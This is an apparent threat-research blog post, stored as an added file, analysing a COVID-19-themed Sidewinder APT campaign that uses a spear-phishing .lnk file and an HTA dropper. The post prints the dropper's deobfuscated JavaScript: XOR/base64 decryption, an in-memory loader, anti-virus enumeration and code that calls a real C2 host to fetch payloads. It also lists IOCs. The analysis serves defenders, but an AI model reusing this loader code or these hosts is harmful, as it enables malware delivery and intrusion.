@@ -1,0 +1,157 @@
+I"�o<p>During the recent spike in COVID-19 themed attacks, cyber-criminals and nation-backed threat actors are using the pandemic as a lure to gain access to critical infrastructure inside organizations.</p>
+
+<h2 id="background">Background</h2>
+<p>Sidewinder a.k.a Rattlesnake is believed to be an Indian state-backed APT group. The threat group actively conducts operations targeting military and governments in Pakistan and China and is believed to be operating since 2012.</p>
+
+<h2 id="source-of-discovery">Source of Discovery</h2>
+<p>The malware sample discovery belongs to the <a href="https://twitter.com/RedDrip7"><strong>RedDrip</strong></a> Team who shared two VirusTotal reports.</p>
+
+<ul>
+  <li><a href="https://www.virustotal.com/gui/file/3d5f133790f807270f6a64743cb593673f820bca4aba406ee08fda1429a340bd/detection"><strong>966029e.hta</strong></a></li>
+  <li><a href="https://www.virustotal.com/gui/file/d302e75752341090fcc9a04bdf8ae8300cc4746b2c4abf7539daafaae275c1f0/detection"><strong>Cb2e3e0[1].hta</strong></a></li>
+</ul>
+
+<h2 id="intrusion-point">Intrusion Point</h2>
+<p>The initial intrusion point of the attack is a spear-phishing email sent to the target. The email contains an executable .lnk file that fakes itself as a PDF. The victim tries to open the PDF and the malicious .lnk file unintentionally gets executed.</p>
+
+<div><center><img src="/assets/img/posts/2020-04-21-lnk-file.png" title="Spear-Phishing .lnk File" /></center></div>
+<p><br />
+The malicious .lnk file contains the address of command and control domain. As soon as the file is executed, the embedded command is executed which downloads the stage-1 .hta dropper from <code class="highlighter-rouge">http://www.nrots.net/images/5328C28B/15936/11348/7c8d64e9/e17e25e</code>.</p>
+
+<h2 id="malware-analysis">Malware Analysis</h2>
+<p>The malware dropper 966029e.hta contains highly obfuscated JavaScript code which can be divided into 4 blocks for understanding. Each block of code is meant for different purposes during the first phase of attack.</p>
+
+<h3 id="decryption-block">Decryption Block</h3>
+<p>The very first function is meant for decoding any base64 string passed to it. The second function consumes an XOR key and a base64 string resulting in decrypted payload. The third function takes a base64 string and sends it to the second function to XOR with a key that is stored in the variable “keeee”. Doing an XOR of the hardcoded base64 string “fGNWc3tkXnB0Zg==” with the hardcoded key “MUgF” results in the value of keeee “1615619693” which will be used to de-obfuscate the embedded payload.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">YiJr</span><span class="p">(</span><span class="nx">str</span><span class="p">){</span>
+    <span class="kd">var</span> <span class="nx">b64</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">ABCDEFGHIJKLMNOPQRSTUVWXY</span><span class="dl">"</span><span class="o">+</span><span class="dl">"</span><span class="s2">Zabcdefghijklmnopqrstuvwxyz0123456789+/=</span><span class="dl">"</span>
+    <span class="kd">var</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">result</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span>
+       <span class="nx">r1</span><span class="p">,</span> <span class="nx">r2</span><span class="p">,</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">str</span><span class="p">.</span><span class="nx">length</span><span class="p">;)</span> <span class="p">{</span>
+        <span class="nx">b</span> <span class="o">=</span> <span class="nx">b64</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">str</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">i</span><span class="o">++</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">18</span> <span class="o">|</span> <span class="nx">b64</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">str</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">i</span><span class="o">++</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span> <span class="o">|</span>
+            <span class="p">(</span><span class="nx">r1</span> <span class="o">=</span> <span class="nx">b64</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">str</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">i</span><span class="o">++</span><span class="p">)))</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="p">(</span><span class="nx">r2</span> <span class="o">=</span> <span class="nx">b64</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">str</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">i</span><span class="o">++</span><span class="p">)));</span>
+        <span class="nx">result</span> <span class="o">+=</span> <span class="nx">r1</span> <span class="o">===</span> <span class="mi">64</span> <span class="p">?</span> <span class="nx">vLpfue</span><span class="p">(</span><span class="nx">b</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="o">&amp;</span> <span class="mi">255</span><span class="p">)</span> <span class="p">:</span>
+            <span class="nx">r2</span> <span class="o">===</span> <span class="mi">64</span> <span class="p">?</span> <span class="nx">vLpfue</span><span class="p">(</span><span class="nx">b</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="o">&amp;</span> <span class="mi">255</span><span class="p">,</span> <span class="nx">b</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="o">&amp;</span> <span class="mi">255</span><span class="p">)</span> <span class="p">:</span>
+            <span class="nx">vLpfue</span><span class="p">(</span><span class="nx">b</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="o">&amp;</span> <span class="mi">255</span><span class="p">,</span> <span class="nx">b</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="o">&amp;</span> <span class="mi">255</span><span class="p">,</span> <span class="nx">b</span> <span class="o">&amp;</span> <span class="mi">255</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
+    <span class="p">};</span>
+<span class="kd">function</span> <span class="nx">xStrAmh</span> <span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">bytes</span><span class="p">){</span>
+    <span class="kd">var</span> <span class="nx">res</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">bytes</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="nx">key</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">vLpfue</span><span class="p">((</span><span class="nx">bytes</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">))</span> <span class="o">^</span> <span class="nx">key</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">j</span><span class="p">)));</span>
+            <span class="nx">i</span><span class="o">++</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&gt;=</span> <span class="nx">bytes</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">j</span> <span class="o">=</span> <span class="nx">key</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="dl">""</span><span class="p">)</span>
+<span class="p">}</span>
+<span class="kd">function</span> <span class="nx">rBEokCwZ</span><span class="p">(</span><span class="nx">bsix</span><span class="p">){</span>
+    <span class="k">return</span> <span class="nx">xStrAmh</span><span class="p">(</span><span class="nx">keeee</span><span class="p">,</span><span class="nx">YiJr</span><span class="p">(</span><span class="nx">bsix</span><span class="p">))</span>
+<span class="p">}</span>
+<span class="kd">var</span> <span class="nx">keeee</span> <span class="o">=</span> <span class="nx">xStrAmh</span><span class="p">(</span><span class="dl">"</span><span class="s2">MUgF</span><span class="dl">"</span><span class="p">,</span><span class="nx">YiJr</span><span class="p">(</span><span class="dl">"</span><span class="s2">fGNW</span><span class="dl">"</span><span class="o">+</span><span class="dl">"</span><span class="s2">c3tk</span><span class="dl">"</span><span class="o">+</span><span class="dl">"</span><span class="s2">XnB0</span><span class="dl">"</span><span class="o">+</span><span class="dl">"</span><span class="s2">Zg==</span><span class="dl">"</span><span class="p">));</span>
+</code></pre></div></div>
+
+<h3 id="memory-writing-block">Memory Writing Block</h3>
+<p>The decryption block decrypts the embedded binary which is loaded into the memory by the memory writing block of the JS script. The following code was decrypted using the functions from the decryption block:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">Func4</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">enc</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject1</span><span class="p">(</span><span class="dl">"</span><span class="s2">System.Text.ASCIIEncoding</span><span class="dl">"</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">length</span> <span class="o">=</span> <span class="nx">enc</span><span class="p">[</span><span class="dl">"</span><span class="s2">GetByteCount_2</span><span class="dl">"</span><span class="p">](</span><span class="nx">b</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">ba</span> <span class="o">=</span> <span class="nx">enc</span><span class="p">[</span><span class="dl">"</span><span class="s2">GetBytes_4</span><span class="dl">"</span><span class="p">](</span><span class="nx">b</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">transform</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject1</span><span class="p">(</span><span class="dl">"</span><span class="s2">System.Security.Cryptography.FromBase64Transform</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nx">ba</span> <span class="o">=</span> <span class="nx">transform</span><span class="p">[</span><span class="dl">"</span><span class="s2">TransformFinalBlock</span><span class="dl">"</span><span class="p">](</span><span class="nx">ba</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">length</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">ms</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject1</span><span class="p">(</span><span class="dl">"</span><span class="s2">System.IO.MemoryStream</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nx">ms</span><span class="p">.</span><span class="nx">Write</span><span class="p">(</span><span class="nx">ba</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="nx">length</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span><span class="p">);</span>
+    <span class="nx">ms</span><span class="p">.</span><span class="nx">Position</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="nx">dash</span> <span class="o">=</span> <span class="nx">ms</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="enumeration-block">Enumeration Block</h3>
+<p>The enumeration block enumerates the victim machine in an attempt to find the current version of .NET framework installed on it. The following code was decrypted using the functions from the decryption block:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">shells</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject1</span><span class="p">(</span><span class="dl">"</span><span class="s2">WScript.Shell</span><span class="dl">"</span><span class="p">);</span>
+<span class="kd">function</span> <span class="nx">tPYpmq</span><span class="p">(){</span>
+    <span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">FSO</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject1</span><span class="p">(</span><span class="dl">"</span><span class="s2">Scripting.FileSystemObject</span><span class="dl">"</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">folds</span> <span class="o">=</span> <span class="nx">FSO</span><span class="p">.</span><span class="nx">GetFolder</span><span class="p">(</span><span class="nx">FSO</span><span class="p">.</span><span class="nx">GetSpecialFolder</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="dl">"</span><span class="se">\</span><span class="s2">Microsoft.NET</span><span class="se">\</span><span class="s2">Framework</span><span class="se">\</span><span class="s2"> </span><span class="dl">"</span><span class="p">).</span><span class="nx">SubFolders</span><span class="p">;</span>
+    <span class="nx">e</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Enumerator</span><span class="p">(</span><span class="nx">folds</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">folder</span><span class="p">;</span>
+    <span class="nx">e</span><span class="p">.</span><span class="nx">moveFirst</span><span class="p">();</span>   
+    <span class="k">while</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">atEnd</span><span class="p">()</span> <span class="o">==</span> <span class="kc">false</span><span class="p">)</span>  
+    <span class="p">{</span>  
+        <span class="nx">folder</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">item</span><span class="p">();</span>
+        <span class="kd">var</span> <span class="nx">files</span> <span class="o">=</span> <span class="nx">folder</span><span class="p">.</span><span class="nx">files</span><span class="p">;</span>
+        <span class="kd">var</span> <span class="nx">fileEnum</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Enumerator</span><span class="p">(</span><span class="nx">files</span><span class="p">);</span>
+        <span class="nx">fileEnum</span><span class="p">.</span><span class="nx">moveFirst</span><span class="p">();</span> 
+        <span class="k">while</span><span class="p">(</span><span class="nx">fileEnum</span><span class="p">.</span><span class="nx">atEnd</span><span class="p">()</span> <span class="o">==</span> <span class="kc">false</span><span class="p">){</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">fileEnum</span><span class="p">.</span><span class="nx">item</span><span class="p">().</span><span class="nx">Name</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">csc.exe</span><span class="dl">"</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">if</span><span class="p">(</span><span class="nx">folder</span><span class="p">.</span><span class="nx">Name</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="o">==</span><span class="dl">"</span><span class="s2">v2</span><span class="dl">"</span><span class="p">)</span>
+                <span class="k">return</span> <span class="dl">"</span><span class="s2">v2.0.50727</span><span class="dl">"</span><span class="p">;</span>
+            <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">folder</span><span class="p">.</span><span class="nx">Name</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="o">==</span><span class="dl">"</span><span class="s2">v4</span><span class="dl">"</span><span class="p">)</span>
+                <span class="k">return</span> <span class="dl">"</span><span class="s2">v4.0.30319</span><span class="dl">"</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="nx">fileEnum</span><span class="p">[</span><span class="nx">moveNext</span><span class="p">]();</span> 
+        <span class="p">}</span>
+        <span class="nx">e</span><span class="p">[</span><span class="nx">moveNext</span><span class="p">]();</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">folder</span><span class="p">.</span><span class="nx">Name</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nx">ver</span> <span class="o">=</span> <span class="nx">v2</span><span class="p">.</span><span class="mf">0.50727</span><span class="p">;</span>
+<span class="k">try</span> <span class="p">{</span>
+    <span class="nx">ver</span> <span class="o">=</span> <span class="nx">Func5</span><span class="p">();</span>
+<span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span> 
+    <span class="nx">ver</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">v2.0.50727</span><span class="dl">"</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="cnc-block">CnC Block</h3>
+<p>The CnC block collects information about installed anti-virus software and its current status of updates on the victim machine. This information is then used to craft a URL <code class="highlighter-rouge">http://www.d01fa.net/plugins/16364/11542/true/true/</code> to communicate with the command and control server and download the related payload.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">shells</span><span class="p">.</span><span class="nx">Environment</span><span class="p">(</span><span class="dl">"</span><span class="s2">Process</span><span class="dl">"</span><span class="p">)(</span><span class="nx">COMPLUS_Version</span><span class="p">)</span> <span class="o">=</span> <span class="nx">ver</span><span class="p">;;</span>
+    <span class="kd">var</span> <span class="nx">objWMIService</span> <span class="o">=</span> <span class="nx">GetObject</span><span class="p">(</span><span class="dl">"</span><span class="s2">winmgmts:</span><span class="se">\\</span><span class="s2">.</span><span class="se">\r</span><span class="s2">oot</span><span class="se">\</span><span class="s2">SecurityCenter2</span><span class="dl">"</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">colItems</span> <span class="o">=</span> <span class="nx">objWMIService</span><span class="p">.</span><span class="nx">ExecQuery</span><span class="p">(</span><span class="dl">"</span><span class="s2">Select * From AntiVirusProduct</span><span class="dl">"</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="mi">48</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">objItem</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Enumerator</span><span class="p">(</span><span class="nx">colItems</span><span class="p">);</span> 
+    <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(;</span> <span class="o">!</span><span class="nx">objItem</span><span class="p">.</span><span class="nx">atEnd</span><span class="p">();</span> <span class="nx">objItem</span><span class="p">[</span><span class="nx">moveNext</span><span class="p">]())</span> <span class="p">{</span>
+    <span class="nx">x</span> <span class="o">+=</span> <span class="p">(</span><span class="nx">objItem</span><span class="p">.</span><span class="nx">item</span><span class="p">().</span><span class="nx">displayName</span> <span class="o">+</span> <span class="dl">"</span><span class="s2"> </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">objItem</span><span class="p">.</span><span class="nx">item</span><span class="p">().</span><span class="nx">productState</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2"> </span><span class="dl">"</span><span class="p">,</span> <span class="dl">""</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="kd">var</span> <span class="nx">stm</span> <span class="o">=</span> <span class="nx">Func4</span><span class="p">(</span><span class="nx">so</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">.</span><span class="dl">"</span><span class="p">).</span><span class="nx">join</span><span class="p">(</span><span class="dl">''</span><span class="p">));</span>
+    <span class="kd">var</span> <span class="nx">fmt</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject1</span><span class="p">(</span><span class="dl">"</span><span class="s2">System.Runtime.Serialization.Formatters.Binary.BinaryFormatter</span><span class="dl">"</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">al</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject1</span><span class="p">(</span><span class="dl">"</span><span class="s2">System.Collections.ArrayList</span><span class="dl">"</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">fmt</span><span class="p">[</span><span class="dl">"</span><span class="s2">Deserialize_2</span><span class="dl">"</span><span class="p">](</span><span class="nx">dash</span><span class="p">);</span>
+    <span class="nx">al</span><span class="p">.</span><span class="nx">Add</span><span class="p">(</span><span class="kc">undefined</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">o</span> <span class="o">=</span> <span class="nx">d</span><span class="p">[</span><span class="dl">"</span><span class="s2">DynamicInvoke</span><span class="dl">"</span><span class="p">](</span><span class="nx">al</span><span class="p">.</span><span class="nx">ToArray</span><span class="p">())[</span><span class="dl">"</span><span class="s2">CreateInstance</span><span class="dl">"</span><span class="p">](</span><span class="nx">ec</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">x</span> <span class="o">&amp;&amp;</span> <span class="nx">x</span><span class="p">.</span><span class="nx">length</span><span class="p">){</span>
+        <span class="nx">x</span> <span class="o">=</span> <span class="nx">x</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">_stg1</span><span class="dl">"</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="kd">var</span> <span class="nx">aUrl</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://www.d01fa.net/plugins/16364/11542/true/true/</span><span class="dl">"</span><span class="o">+</span><span class="nx">x</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h3 id="embedded-binary--decoy">Embedded Binary &amp; Decoy</h3>
+<p>Within the dropper, two variables contain huge encrypted strings. One of the variables contains the stage-2 binary that is decrypted and written directly into the memory. The second variable contains content of a decoy PDF which is decrypted and shown to the victim. Analysis of the binary embedded in the former variable reveals its original name as <strong><em>LinkZip.dll</em></strong>. The binary is a <a href="https://github.com/tyranid/DotNetToJScript"><strong>DotNetToJScript</strong></a> converter written by <a href="https://twitter.com/tiraniddo">James Forshaw</a>.</p>
+
+<div><center><img src="/assets/img/posts/2020-04-21-embedded-binary.png" title="Embedded DotNetToJScript Binary" /></center></div>
+<p><br />
+The dropper also downloads a variant of the malware named <a href="https://www.virustotal.com/gui/file/34ab2e72624e808efa66cccb9ea2ec086b02927165dfc00d477cf573ffff2761/detection">file.hta</a> for persistence. The decryption mechanism of the <strong>file.hta</strong> is the same as the .hta dropper and is responsible for dropping the following binaries <code class="highlighter-rouge">C:\ProgramData\</code></p>
+
+<ul>
+  <li><a href="https://www.virustotal.com/gui/file/c69456894fb70e6dfb4ef38bc926f8fc90a82a7b9427f429581a7cee22e09411/detection"><strong>Duser.dll</strong></a> - XOR decryptor for file containing the RAT</li>
+  <li>SOHYXY.tmp - Encrypted payload decrypted by Duser.dll</li>
+  <li>rekeywiz.exe - Windows legit binary</li>
+  <li>rekeywiz.conf - configuration file for rekeywiz.conf</li>
+</ul>
+
+<p><em>Duser.dll</em> decrypts the file named <em>“SOHYXY.tmp”</em> and deploys the RAT for performing reconnaissance on the victim machines. The commands issued by the C2 server are stored in an encrypted file named <a href="https://www.virustotal.com/gui/file/5e20dcef43ed82e97b881220f0e6971af364874f42849cea6e90030ebbd69f6c/detection"><strong>font</strong></a>. After decryption using the already discussed methodology, the C2 commands are revealed indicating that the stolen information is sent to <code class="highlighter-rouge">cloud-apt.net</code>
+<br />
+<br /></p>
+
+<hr />
+<p><a href="https://github.com/ahmadmkhan1/Threat-Research/blob/master/20200410_sidewinder_covid19-themed-attack-to-deploy-RAT.yar"><strong><em>IOCs and YARA Signatures</em></strong></a></p>
+:ET
